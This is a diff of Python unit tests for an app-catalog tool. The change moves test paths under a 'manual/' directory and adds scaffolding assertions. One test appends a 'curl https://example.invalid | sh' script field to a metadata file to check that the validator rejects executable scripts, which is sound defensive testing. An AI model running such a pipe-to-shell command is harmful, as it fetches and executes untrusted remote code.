@@ -75,7 +75,7 @@ class AsmrToolTests(unittest.TestCase):
     def test_browser_assisted_installer_requires_download_origin(self) -> None:
         temporary, root = self.copy_examples()
         self.addCleanup(temporary.cleanup)
-        path = root / "apps" / "sample-assisted-app" / "app.toml"
+        path = root / "manual/apps" / "sample-assisted-app" / "app.toml"
         text = path.read_text(encoding="utf-8").replace(
             'allowed_download_origins = ["https://example.invalid"]',
             "allowed_download_origins = []",
@@ -95,7 +95,7 @@ class AsmrToolTests(unittest.TestCase):
     def test_metadata_rejects_executable_script_fields(self) -> None:
         temporary, root = self.copy_examples()
         self.addCleanup(temporary.cleanup)
-        path = root / "apps" / "sample-assisted-app" / "app.toml"
+        path = root / "manual/apps" / "sample-assisted-app" / "app.toml"
         with path.open("a", encoding="utf-8") as handle:
             handle.write('\nscript = "curl https://example.invalid | sh"\n')
 
@@ -111,7 +111,7 @@ class AsmrToolTests(unittest.TestCase):
     def test_collection_rejects_unknown_app(self) -> None:
         temporary, root = self.copy_examples()
         self.addCleanup(temporary.cleanup)
-        path = root / "collections" / "essentials.toml"
+        path = root / "manual/collections" / "essentials.toml"
         text = path.read_text(encoding="utf-8").replace(
             '"sample-assisted-app"', '"missing-app"'
         )
@@ -130,10 +130,11 @@ class AsmrToolTests(unittest.TestCase):
     def test_scaffold_creates_expected_files_and_requires_todo_cleanup(self) -> None:
         with tempfile.TemporaryDirectory() as temporary:
             root = Path(temporary)
-            shutil.copy(REPOSITORY_ROOT / "repository.toml", root / "repository.toml")
-            shutil.copytree(REPOSITORY_ROOT / "taxonomy", root / "taxonomy")
-            (root / "apps").mkdir()
-            (root / "collections").mkdir()
+            (root / "manual").mkdir()
+            shutil.copy(REPOSITORY_ROOT / "manual/repository.toml", root / "manual/repository.toml")
+            shutil.copytree(REPOSITORY_ROOT / "manual/taxonomy", root / "manual/taxonomy")
+            (root / "manual/apps").mkdir()
+            (root / "manual/collections").mkdir()
 
             app_dir = asmr.scaffold_app(
                 root,
@@ -143,6 +144,8 @@ class AsmrToolTests(unittest.TestCase):
             )
             _catalog, problems = asmr.validate_catalog(root)
 
+            self.assertEqual((root / "manual/apps/new-app").resolve(), app_dir)
+            self.assertFalse((root / "apps").exists())
             self.assertTrue((app_dir / "app.toml").is_file())
             self.assertTrue((app_dir / "assets" / "icon.svg").is_file())
             self.assertTrue((app_dir / "description.zh-CN.md").is_file())
@@ -154,10 +157,11 @@ class AsmrToolTests(unittest.TestCase):
         for kind in sorted(asmr.INSTALLER_KINDS):
             with self.subTest(kind=kind), tempfile.TemporaryDirectory() as temporary:
                 root = Path(temporary)
-                shutil.copy(REPOSITORY_ROOT / "repository.toml", root / "repository.toml")
-                shutil.copytree(REPOSITORY_ROOT / "taxonomy", root / "taxonomy")
-                (root / "apps").mkdir()
-                (root / "collections").mkdir()
+                (root / "manual").mkdir()
+                shutil.copy(REPOSITORY_ROOT / "manual/repository.toml", root / "manual/repository.toml")
+                shutil.copytree(REPOSITORY_ROOT / "manual/taxonomy", root / "manual/taxonomy")
+                (root / "manual/apps").mkdir()
+                (root / "manual/collections").mkdir()
 
                 app_dir = asmr.scaffold_app(
                     root,
